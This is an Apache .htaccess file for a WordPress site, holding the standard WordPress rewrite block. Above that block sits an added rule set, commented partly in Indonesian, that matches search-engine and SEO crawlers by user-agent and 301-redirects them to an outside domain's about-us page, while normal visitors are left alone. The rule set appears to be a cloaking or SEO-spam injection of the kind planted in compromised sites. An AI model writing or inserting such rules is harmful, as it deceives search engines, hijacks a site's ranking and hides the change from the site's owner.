RewriteEngine On

# Redirect 
RewriteCond %{REQUEST_URI} !^/about-us/?$ [NC]

# Deteksi user-agent
RewriteCond %{HTTP_USER_AGENT} (Googlebot|Bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot|Sogou|Exabot|facebot|facebookexternalhit|ia_archiver|MJ12bot|AhrefsBot|SemrushBot|DotBot|SeznamBot|crawler|spider|bot) [NC]

# Redirect 
RewriteRule ^ https://epkamatgroup.com/about-us/ [R=301,L]

# BEGIN WordPress
# The directives (lines) between "BEGIN WordPress" and "END WordPress" are
# dynamically generated, and should only be modified via WordPress filters.
# Any changes to the directives between these markers will be overwritten.
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>
# END WordPress
